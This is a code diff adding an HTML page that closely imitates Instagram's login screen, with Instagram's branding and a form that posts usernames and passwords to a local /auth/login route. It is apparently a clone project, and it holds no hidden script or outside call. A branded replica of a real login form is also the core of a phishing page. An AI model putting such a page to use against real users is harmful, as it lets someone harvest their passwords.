@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="icon" type="image/x-icon" href="/utils/tab_instagram_icon.png" />
+  <link href="/styles/index.css" rel="stylesheet">
+</head>
+
+<body>
+  <div class="container">
+    <main class="main-content">
+      <!-- Image Section -->
+      <div class="phone-preview">
+        <img src="/utils/Instagram_Image_2x.png" alt="phone-frame" class="phone-frame">
+      </div>
+
+      <!-- Login Section -->
+      <div class="login-section">
+        <!-- Login Form -->
+        <div class="login-form-container">
+          <div class="logo-container">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png"
+              alt="Instagram"
+              class="instagram-logo">
+          </div>
+
+          <form class="login-form" method="POST" action="/auth/login">
+            <div class="input-group">
+              <input type="text" name="username" placeholder="Phone number, username, or email" class="form-input" required>
+            </div>
+
+            <div class="input-group">
+              <input type="password" name="password" placeholder="Password" class="form-input" required>
+              <button type="button" class="password-toggle">Show</button>
+            </div>
+
+            <button type="submit" class="login-button">Log in</button>
+
+            <div class="separator">
+              <div class="line"></div>
+              <span class="or-text">OR</span>
+              <div class="line"></div>
+            </div>
+
+            <button type="button" class="facebook-login">
+              <svg class="facebook-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path
+                  d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"
+                  fill="#1877f2" />
+              </svg>
+              <span>Log in with Facebook</span>
+            </button>
+
+            <a href="#" class="forgot-password">Forgot password?</a>
+          </form>
+        </div>
+
+        <!-- Sign Up Section -->
+        <div class="signup-container">
+          <p>Don't have an account? <a href="/auth/register" class="signup-link">Sign up</a></p>
+        </div>
+      </div>
+    </main>
+
+    <!-- Footer Area -->
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+        <a href="#">Settlement Agreements</a>
+      </div>
+
+      <div class="footer-bottom">
+        <select class="language-selector">
+          <option value="en">English</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+          <option value="de">Deutsch</option>
+          <option value="it">Italiano</option>
+          <option value="he">עברית</option>
+          <option value="nl">Netherlands</option>
+          <option value="dn">Dansk</option>
+        </select>
+        <span class="copyright">© 2025 Instagram from Meta</span>
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
